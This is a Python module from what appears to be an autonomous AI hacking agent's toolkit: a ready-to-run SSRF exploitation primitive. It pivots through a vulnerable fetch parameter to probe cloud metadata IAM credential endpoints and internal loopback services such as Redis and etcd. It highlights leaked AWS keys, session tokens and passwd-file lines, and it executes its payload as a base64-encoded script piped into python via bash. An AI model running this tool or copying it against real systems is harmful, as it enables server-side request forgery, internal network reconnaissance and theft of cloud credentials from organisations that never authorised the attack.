"""SSRF recon — an executable exploit PRIMITIVE (same shape as solver._blind_extract).

The agent already STAGED-RECONs any host:port it can reach directly (recon.py). But a
surface reachable only THROUGH a vulnerable fetch/preview/webhook param — one that makes the
SERVER fetch a URL — can't be curled. This primitive pivots through that param: one tool call
sweeps a high-value internal target list (cloud metadata + common loopback services) THROUGH
the SSRF, reflects out the fetched body, and returns a compact map of what answered — the
internal surface the agent then exploits.

Pure stdlib (urllib), paced, backs off on HTTP 429. Ceiling: this maps SSRFs that REFLECT the
fetched content (the common preview/fetch/webhook kind). A fully-blind SSRF with no reflection
proves reachability only out-of-band (DNS/HTTP callback) — that needs an OOB collaborator and
is out of scope here.
"""
import base64
import json

# High-value defaults: what an operator probes first through a fresh SSRF.
_METADATA = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
]
_PORTS = [80, 8080, 8000, 3000, 5000, 9090, 6379, 8500, 2379, 15672]
_DEFAULT_TARGETS = _METADATA + [
    f"http://{host}:{port}/" for host in ("127.0.0.1", "localhost") for port in _PORTS
]


def _script(params: dict) -> str:
    """The primitive as a self-contained stdlib script run inside the sandbox."""
    return "import json,sys,time,re,urllib.request,urllib.error\n" + \
           "from urllib.parse import quote\n" + \
           f"P=json.loads(r'''{json.dumps(params)}''')\n" + r'''
SU=P["ssrf_url"]; TARGETS=P["targets"]
TIMEOUT=float(P.get("timeout",8)); DELAY=float(P.get("delay_between",0.2))
scre=re.compile(P["success_re"],re.I) if P.get("success_re") else None
rfre=re.compile(P["reflect_re"],re.S) if P.get("reflect_re") else None
# always-highlight patterns: metadata creds + common service banners
INT=re.compile(r"AccessKeyId|SecretAccessKey|SessionToken|ami-[0-9a-f]|iam|instance-id|"
               r"\bToken\b|redis_version|\+OK|\bPONG\b|Server:\s|X-Powered-By|"
               r"Consul|etcd|RabbitMQ|<title|admin|root:.*:0:0",re.I)
# generic "server couldn't reach it" reflections => unreachable when no success_re given
ERR=re.compile(r"could\s*not|couldn.?t|connection refused|failed to (?:fetch|connect|open)|"
               r"no route|timed out|unreachable|refused|invalid url|bad (?:url|request)|ERR:",re.I)

def fetch(url):
    for a in range(6):
        try:
            r=urllib.request.urlopen(url,timeout=TIMEOUT)
            return r.getcode(), r.read().decode("utf-8","replace")
        except urllib.error.HTTPError as e:
            if e.code==429:
                time.sleep(2*(a+1)); continue
            try: body=e.read().decode("utf-8","replace")
            except Exception: body=""
            return e.code, body
        except Exception as ex:
            return None, "ERR:"+str(ex)[:120]
    return 429, ""

def trim(s,n=180):
    s=" ".join(s.split())
    return s if len(s)<=n else s[:n]+"..."

lines=[]; reach=0; creds=0
for t in TARGETS:
    st,body=fetch(SU.replace("{target}",quote(t,safe="")))
    time.sleep(DELAY)
    inner=body
    if rfre:                                   # pull the fetched body out of the outer response
        m=rfre.search(body)
        inner=(m.group(1) if m.groups() else m.group(0)) if m else ""
    inner=inner.strip()
    hits=sorted(set(m.group(0) for m in INT.finditer(inner)))
    if scre is not None:
        ok=bool(scre.search(inner))
    else:                                      # default: non-empty, not an error reflection
        ok=bool(hits) or (bool(inner) and not inner.startswith("ERR:")
                          and (st is None or st<500) and not ERR.search(inner))
    if ok:
        reach+=1
        if any(h.lower() in ("accesskeyid","secretaccesskey","sessiontoken") for h in hits): creds+=1
        tag=" !INTERESTING: "+",".join(hits) if hits else ""
        lines.append("[REACHABLE] %-52s status=%s size=%d%s\n    %s"%(
            t,st,len(body),tag,trim(inner)))
    else:
        lines.append("[--        ] %-52s status=%s size=%d"%(t,st,len(body)))

print("SSRF_RECON_OK reachable=%d/%d creds=%d via %s"%(reach,len(TARGETS),creds,SU))
print("\n".join(lines))
'''


def _targets(raw):
    """Accept a list, or a newline/comma-separated string (SDK params are flat), or None."""
    if not raw:
        return list(_DEFAULT_TARGETS)
    if isinstance(raw, str):
        return [t.strip() for t in raw.replace(",", "\n").splitlines() if t.strip()]
    return [str(t).strip() for t in raw if str(t).strip()]


def run(sb, args: dict) -> str:
    """Validate args, run the primitive script in the sandbox, return its output."""
    ssrf_url = args.get("ssrf_url") or ""
    if "{target}" not in ssrf_url:
        return ("ssrf_recon error: 'ssrf_url' must contain the literal token {target} where the "
                "server-side-fetched URL is injected, e.g. 'http://host/fetch?url={target}'.")
    targets = _targets(args.get("targets"))
    if not targets:
        return "ssrf_recon error: no targets to probe (empty 'targets' after parsing)."
    params = {
        "ssrf_url": ssrf_url,
        "targets": targets,
        "timeout": float(args.get("timeout") or 8),
        "delay_between": float(args.get("delay_between") or 0.2),
    }
    if args.get("success_re"):
        params["success_re"] = args["success_re"]
    if args.get("reflect_re"):
        params["reflect_re"] = args["reflect_re"]
    b64 = base64.b64encode(_script(params).encode()).decode()
    return sb.bash(f"echo {b64} | base64 -d | python3 -")
